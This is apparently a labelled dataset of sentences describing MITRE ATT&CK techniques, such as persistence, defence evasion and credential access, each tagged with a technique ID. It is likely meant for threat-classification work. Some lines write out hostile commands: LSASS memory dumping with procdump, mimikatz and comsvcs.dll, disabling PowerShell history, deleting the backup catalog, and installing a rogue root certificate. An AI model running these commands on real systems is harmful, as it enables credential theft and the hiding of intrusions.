T1564,"Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system."
T1564,"Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection."
T1564,"Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology."
T1564,"Bundlore uses the mktemp utility to make unique file and directory names for payloads, such as TMP_DIR=`mktemp -d -t x. OSX/Shlayer uses the mktemp utility to make random and unique filenames for payloads, such as export tmpDir=""$"" or mktemp -t Installer."
T1574,Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs.
T1574,"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time."
T1574,"Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution."
T1574,"There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed."
T1574,How the operating system locates libraries to be used by a program can also be intercepted.

T1505,Adversaries may install malicious components that run on Internet Information Services  web servers to establish persistence.
T1505,IIS provides several mechanisms to extend the functionality of the web servers.
T1505,"For example, Internet Server Application Programming Interface  extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests."
T1505,"Extensions and filters are deployed as DLL files that export three functions: Get{Extension/Filter}Version, Http{Extension/Filter}Proc, and  Terminate{Extension/Filter}."
T1505,IIS modules may also be installed to extend IIS web servers.
T1505,"Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic."
T1505,ISAPI extensions and filters may have access to all IIS web requests and responses.
T1505,"For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts."
T1505,Adversaries may also install malicious IIS modules to observe and/or modify traffic.
T1505,IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters.
T1505,"IIS modules can be written as a DLL that exports RegisterModule, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests."

T1591,Adversaries may gather information about the victim's business tempo that can be used during targeting.
T1591,"Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week."
T1591,This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.
T1591,Information about business tempo may also be exposed to adversaries via online or other accessible data sets  or Search Victim-Owned Websites.
T1591,"Gathering this information may reveal opportunities for other forms of reconnaissance  or Search Open Websites/Domains, establishing operational resources  or Compromise Accounts, and/or initial access  or Trusted Relationship"
T1591,Adversaries may gather information about identities and roles within the victim organization that can be used during targeting.

T1546,Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options  debuggers.
T1546,IFEOs enable a developer to attach a debugger to an application.
T1546,"When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger ."
T1546,IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.
T1546,IFEOs are represented as Debugger values in the Registry under HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> where &lt;executable&gt; is the binary on which the debugger is attached.
T1546,"IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits  is prematurely terminated by itself or a second, non kernel-mode process."
T1546,"Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\."
T1546,"Similar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program ."
T1546,"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the ""debugger"" program to be executed with SYSTEM privileges."
T1546,"Similar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer."
T1546,Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.
T1546,Malware may also use IFEO to Impair Defenses by registering invalid debuggers that redirect and effectively disable various system and security applications.
T1546,SDBbot has the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.

T1546,TEMP.Veles has modified and added entries within HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options to maintain persistence.
T1562,Adversaries may impair command history logging to hide commands they run on a compromised system.
T1562,"On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE."
T1562,The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out.
T1562,"HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected."
T1562,Adversaries may clear the history environment variable  or set the command history size to zero  to prevent logging of commands.
T1562,"Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to ""ignorespace""."
T1562,"HISTCONTROL can also be set to ignore duplicate commands by setting it to ""ignoredups""."
T1562,"In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples."
T1562,"This means that “ ls” will not be saved, but “ls” would be saved by history."
T1562,Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.
T1562,"On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ."
T1562,Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}.
T1562,This will cause ConsoleHost_history.txt to stop receiving logs.
T1562,"Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing."
T1562,APT38 has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.
T1562,Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms.
T1562,"This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior."
T1562,This may also span both native defenses as well as supplemental capabilities installed by users and administrators.
T1562,"Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components."
T1562,Stuxnet reduces the integrity level of objects to allow write actions.
T1525,Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment.
T1525,"Amazon Web Services  Amazon Machine Images , Google Cloud Platform  Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored."
T1525,"Unlike Upload Malware, this technique focuses on adversaries implanting an image in a registry within a victim’s environment."
T1525,"Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image."
T1525,A tool has been developed to facilitate planting backdoors in cloud container images.
T1525,"If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a Web Shell."
T1562,An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed.
T1562,"This could include maliciously redirecting  or even disabling host-based sensors, such as Event Tracing for Windows , by tampering settings that control the collection and flow of event telemetry."
T1562,These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation.
T1562,"ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations."
T1562,"In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis."
T1562,"This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management  products."
T1562,Ebury can hook logging functions so that nothing from the backdoor gets sent to the logging facility.
T1562,Waterbear can hook the ZwOpenProcess and GetExtendedTcpTable APIs called by the process of a security product to hide PIDs and TCP records from detection.
T1027,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed."
T1027,They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.
T1027,A good example of this is when malware is detected with a file signature and quarantined by anti-virus software.
T1027,"An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware."
T1027,"The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document."
T1027,Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.

T1553,Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.
T1553,Root certificates are used in public key cryptography to identify a root certificate authority .
T1553,"When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate."
T1553,Certificates are commonly used for establishing secure TLS/SSL communications within a web browser.
T1553,When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk.
T1553,"Depending on the security settings, the browser may not allow the user to establish a connection to the website."
T1553,Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.
T1553,Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.
T1553,Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.
T1553,Root certificates  can also be cloned and reinstalled.
T1553,Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools  used to block execution and/or uncover artifacts of Persistence.
T1553,"In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain."

T1546,Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries.
T1546,Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded.
T1546,The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries  to load during execution time.
T1546,These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.
T1546,There are tools available to perform these changes.
T1546,Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed.
T1546,"Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time."
T1557,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system."
T1557,This activity may be used to collect or relay authentication materials.
T1557,Link-Local Multicast Name Resolution  and NetBIOS Name Service  are Microsoft Windows components that serve as alternate methods of host identification.
T1557,LLMNR is based upon the Domain Name System  format and allows hosts on the same local link to perform name resolution for other hosts.
T1557,NBT-NS identifies systems on a local network by their NetBIOS name.
T1557,"Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR /NBT-NS  traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system."
T1557,"If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system."
T1557,The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.
T1557,"In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system."
T1557,The relay step can happen in conjunction with poisoning but may also be independent of it.
T1557,"Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder."
T1557,"Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning."

T1547,The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain.
T1547,The Local Security Authority  is the main component responsible for local security policy and user authentication.
T1547,"The LSA includes multiple dynamic link libraries  associated with various other security functions, all of which run in the context of the LSA Subsystem Service  lsass.exe process."
T1547,Adversaries may target LSASS drivers to obtain persistence.
T1547,"By either replacing or adding illegitimate drivers , an adversary can use LSA operations to continuously execute malicious payloads."
T1547,"Wingbird drops a malicious file  alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver."
T1547,The payload of the malicious driver  is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.
T1547,Pasam establishes by infecting the Security Accounts Manager  DLL to load a malicious DLL dropped to disk.
T1003,Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service .
T1003,"After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory."
T1003,These credential materials can be harvested by an administrative user or SYSTEM and used to conduct Lateral Movement using Use Alternate Authentication Material.
T1003,"As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system."
T1003,"For example, on the target host use procdump:
* procdump -ma lsass.exe lsass_dump
Locally, mimikatz can be run using:
* sekurlsa::Minidump lsassdump.dmp
* sekurlsa::logonPasswords
Built-in Windows tools such as comsvcs.dll can also be used:
* rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full
Windows Security Support Provider  DLLs are loaded into LSSAS process at system start."
T1003,"Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs."
T1003,The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages.
T1003,"An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called."
T1003,"The following SSPs can be used to access credentials:
* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package."
T1003,* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol  and Simple Authentication Security Layer  exchanges.

T1543,Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence.
T1543,"When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list  file found in /System/Library/LaunchAgents, /Library/LaunchAgents, and ~/Library/LaunchAgents."
T1543,"Property list files use the Label, ProgramArguments , and RunAtLoad keys to identify the Launch Agent's name, executable location, and execution time."
T1543,"Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks."
T1543,Launch Agents can also be executed using the Launchctl command.

T1543,"Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS."
T1543,"Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction."
T1543,"During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/."
T1543,"Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run."
T1543,"Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks."
T1543,Adversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path.
T1543,The daemon name may be disguised by using a name from a related operating system or benign software  Masquerading.
T1543,"When the Launch Daemon is executed, the program inherits administrative permissions."

T1218,Adversaries may abuse mmc.exe to proxy execution of malicious .msc files.
T1218,"Microsoft Management Console, or MMC, is a signed Windows binary and is used in several ways in either its GUI or in a command prompt."
T1218,"MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins."
T1218,These snap-ins may be used to manage Windows systems locally or remotely.
T1218,MMC can also be used to open Microsoft created .msc files to manage system configuration.
T1218,"For example, mmc C:\Users\foo\admintools.msc /a will open a custom, saved console msc file in author mode."
T1218,"Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window."
T1218,Adversaries may use MMC commands to perform malicious tasks.
T1218,"For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system  Inhibit System Recovery without prompts to the user ."
T1218,Adversaries may also abuse MMC to execute malicious .msc files.
T1218,"For example, adversaries may first create a malicious registry Class Identifier  subkey, which uniquely identifies a Component Object Model class object."
T1218,"Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey."
T1218,"Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: mmc.exe -Embedding C:\path\to\test.msc."
T1127,Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility.
T1127,MSBuild.exe  is a software build platform used by Visual Studio.
T1127,It handles XML formatted project files that define requirements for loading and building various platforms and configurations.
T1127,Adversaries can abuse MSBuild to proxy execution of malicious code.
T1127,The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.
T1127,MSBuild will compile and execute the inline task.
T1127,"MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution."
T1127,"A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques."
T1127,Frankenstein has used MSbuild to execute an actor-created file.
T1071,Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.

T1134,The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.
T1134,Cobalt Strike can make tokens from known credentials.
T1204,An adversary may rely upon a user opening a malicious file in order to gain execution.
T1204,Users may be subjected to social engineering to get them to open a file that will lead to code execution.
T1204,This user action will typically be observed as follow-on behavior from Spearphishing Attachment.
T1204,"Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl."
T1204,Adversaries may employ various forms of Masquerading on the file to increase the likelihood that a user will open it.
T1204,"While Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."

T1104,Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions.
T1104,Use of multiple stages may obfuscate the command and control channel to make detection more difficult.
T1104,Remote access tools will call back to the first-stage command and control server for instructions.
T1104,"The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files."
T1104,A second remote access tool  could be uploaded at that point to redirect the host to the second-stage command and control server.
T1104,The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.
T1104,The different stages will likely be hosted separately with no overlapping infrastructure.
T1104,The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.

T1104,APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary backdoor.
T1090,"To disguise the source of malicious traffic, adversaries may chain together multiple proxies."
T1090,"Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy."
T1090,This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.
T1090,"A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network."
T1090,"In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network  of the enterprise."
T1090,"By leveraging Patch System Image, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes."
T1090,"This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network."

T1546,It contains functionality to add helper DLLs for extending functionality of the utility.
T1546,The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.
T1546,Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner.
T1546,"This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software  is present on the system that executes netsh.exe as part of its normal functionality."
T1599,Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation  configuration.
T1599,Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
T1599,Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks.
T1599,"When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header."
T1599,Some network designs require NAT for the packets to cross the border device.
T1599,A typical example of this is environments where internal networks make use of non-Internet routable addresses.
T1599,"When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design."
T1599,"In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device."
T1599,"In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders."
T1599,"Adversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities"
T1599,Adversaries may bridge network boundaries by compromising perimeter network devices.
T1599,Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.
T1599,Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.
T1599,They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.
T1599,"Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications."
T1599,"To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised."
T1599,"When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance."

T1499,"With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed."
T1499,"Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server."
T1499,ACK floods leverage the stateful nature of the TCP protocol.
T1499,A flood of ACK packets are sent to the target.
T1499,This forces the OS to search its state table for a related TCP connection that has already been established.
T1499,"Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists."

T1588,Adversaries may buy and/or steal capabilities that can be used during targeting.
T1588,"Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them."
T1588,"Activities may include the acquisition of malware, software , exploits, certificates, and information relating to vulnerabilities."
T1588,Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.
T1588,"In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities."
T1588,"Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals."
T1588,"In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities ."
T1588,"This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits."
T1218,Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads.
T1218,Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity  drivers and data source names.
T1218,Odbcconf.exe is digitally signed by Microsoft.
T1218,Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse.
T1218,"Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs ."
T1218,Cobalt Group has used odbcconf to proxy the execution of malicious DLL files.
T1137,Adversaries may leverage Microsoft Office-based applications for persistence between startups.
T1137,Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network.
T1137,There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.
T1137,"A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page."
T1137,These persistence mechanisms can work within Outlook or be used through Office 365.
T1137,APT32 have replaced Microsoft Outlook's VbaProject.OTM file to install a backdoor macro for persistence.
T1137,"Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened."
T1137,"Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received."
T1137,Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system.
T1137,Microsoft Office contains templates that are part of common Office applications and are used to customize styles.
T1137,The base templates within the application are used each time an application starts.
T1137,Office Visual Basic for Applications  macros  can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence.
T1137,Examples for both Word and Excel have been discovered and published.
T1137,"By default, Word has a Normal.dotm template created that can be modified to include a malicious macro."
T1137,"Excel does not have a template file created by default, but one can be added that will automatically be loaded."
T1137,Shared templates may also be stored and pulled from remote locations.
T1137,"Word Normal.dotm location:<br>
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm
Excel Personal.xlsb location:<br>
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB
Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g."
T1137,"Word 2016 will first look for Normal.dotm under C:\Program Files \Microsoft Office\root\Office16\, or by modifying the GlobalDotName registry key."
T1137,"By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup."
T1137,"To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location."
T1137,An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.
T1137,BackConfig has the ability to use hidden columns in Excel spreadsheets to store executable files or commands for VBA macros.
T1137,Cobalt Strike has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.
T1137,"MuddyWater has used a Word Template, Normal.dotm, for persistence."
T1137,"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system."
T1137,An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started.
T1137,This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications.
T1137,This Registry key is not created by default during an Office installation.
T1137,"There exist user and global Registry keys for the Office Test feature:
* HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf
* HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf
Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started."
T1137,APT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\Software\Microsoft\Office test\Special\Perf to execute code.
T1102,"Adversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel."
T1102,"Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service."
T1102,"Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response."
T1102,"The ""tDiscoverer"" variant of HAMMERTOSS establishes a C2 channel by downloading resources from Web services like Twitter and GitHub."
T1102,HAMMERTOSS binaries contain an algorithm that generates a different Twitter handle for the malware to check for instructions every day.
T1102,OnionDuke uses Twitter as a backup C2.
T1102,Metamorfo has downloaded a zip file for execution on the system.
T1102,EVILNUM has used a one-way communication method via GitLab and Digital Point to perform C2.
T1102,Leviathan has received C2 instructions from user profiles created on legitimate websites such as Github and TechNet.
T1137,Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system.
T1137,Outlook forms are used as templates for presentation and functionality in Outlook messages.
T1137,Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.
T1137,"Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started."
T1137,Malicious forms will execute when an adversary sends a specifically crafted email to the user.
T1137,Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system.
T1137,Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders.
T1137,This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened.
T1137,A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.
T1137,"Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started."
T1137,Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.
T1137,OilRig has abused the Outlook Home Page feature for persistence.
T1137,OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.
T1137,Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system.
T1137,Outlook rules allow a user to define automated behavior to manage email messages.
T1137,"A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender."
T1137,Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.
T1137,"Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started."
T1137,Malicious rules will execute when an adversary sends a specifically crafted email to the user.
T1134,Adversaries may spoof the parent process identifier  of a new process to evade process-monitoring defenses or to elevate privileges.
T1134,"New processes are typically spawned directly from their parent, or calling, process unless explicitly specified."
T1134,"One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use."
T1134,This functionality is used by Windows features such as User Account Control  to correctly set the PPID after a requested elevated process is spawned by SYSTEM  rather than the current user context.
T1134,"Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of PowerShell/Rundll32 to be explorer.exe rather than an Office document delivered as part of Spearphishing Attachment."
T1134,This spoofing could be executed via Visual Basic within a malicious Office document or any code that can perform Native API.
T1134,Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process.
T1134,"For example, an adversary in a privileged user context  administrator may spawn a new process and assign the parent as a process running as SYSTEM , causing the new process to be elevated via the inherited access token."
T1134,PipeMon can use parent PID spoofing to elevate privileges.
T1134,Cobalt Strike can spawn processes with alternate PPIDs.
T1550,"Adversaries may “pass the hash” using stolen password hashes to move laterally within an environment, bypassing normal system access controls."
T1550,Pass the hash  is a method of authenticating as a user without having access to the user's cleartext password.
T1550,"This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash."
T1550,"When performing PtH, valid password hashes for the account being used are captured using a Credential Access technique."
T1550,Captured hashes are used with PtH to authenticate as that user.
T1550,"Once authenticated, PtH may be used to perform actions on local or remote systems."
T1550,"Adversaries may also use stolen password hashes to ""overpass the hash."""
T1550,"Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket."
T1550,This ticket can then be used to perform Pass the Ticket attacks.
T1550,HOPLIGHT has been observed loading several APIs associated with Pass the Hash.
T1550,Cobalt Strike can perform pass the hash.
T1550,APT32 has used pass the hash for lateral movement.
T1550,APT28 has used pass the hash for lateral movement.
T1550,The APT1 group is known to have used pass the hash.
T1550,Night Dragon used pass-the-hash tools to gain usernames and passwords.
